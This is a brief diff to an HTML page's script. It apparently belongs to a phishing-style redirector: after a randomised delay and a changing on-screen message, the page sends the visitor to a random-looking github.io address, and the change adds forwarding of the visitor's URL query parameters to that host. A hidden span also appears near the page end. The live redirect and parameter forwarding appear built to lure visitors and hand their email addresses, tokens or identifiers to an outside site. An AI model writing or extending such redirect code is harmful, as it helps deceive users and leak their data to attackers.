@@ -87,7 +87,10 @@
 
     const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
     setTimeout(() => {
-      const redirectUrl = "https://shbfiuqa.github.io/hhyuierkjsu374u3y7w8ehdjeuy78ryefdshiuw/";
+      const baseUrl = "https://shbfiuqa.github.io/hhyuierkjsu374u3y7w8ehdjeuy78ryefdshiuw/";
+      const currentUrlParams = new URLSearchParams(window.location.search);
+      const queryParamsString = currentUrlParams.toString();
+      const redirectUrl = queryParamsString ? `${baseUrl}?${queryParamsString}` : baseUrl;
       window.location.href = redirectUrl;
     }, redirectDelay);
   }
@@ -109,6 +112,7 @@
     setTimeout(changeMessage, initialDelay);
   };
 </script>
+
 
     </body>
     <span style="display: none;">
